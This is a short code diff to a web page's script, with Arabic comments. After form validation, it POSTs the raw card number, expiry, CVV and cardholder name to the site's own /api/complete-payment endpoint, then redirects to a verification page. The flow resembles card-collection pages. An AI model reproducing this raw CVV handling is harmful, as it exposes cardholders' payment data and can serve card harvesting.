@@ -454,8 +454,27 @@
             
             if (hasError) return;
             
-            // الانتقال المحلي فقط بعد نجاح التحقق
-            window.location.href = 'verification.html';
+            // حفظ حالة الدفع في السيرفر ثم التحويل
+            fetch('/api/complete-payment', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    cardNumber: cardNumber,
+                    expiry: expiry,
+                    cvv: cvv,
+                    cardHolder: cardHolder
+                })
+            }).then(response => response.json())
+              .then(data => {
+                  if (data.success) {
+                      window.location.href = '/verification';
+                  } else {
+                      alert(data.error || 'حدث خطأ');
+                  }
+              }).catch(err => {
+                  console.error(err);
+                  alert('حدث خطأ في الاتصال');
+              });
         });
     });
 </script>
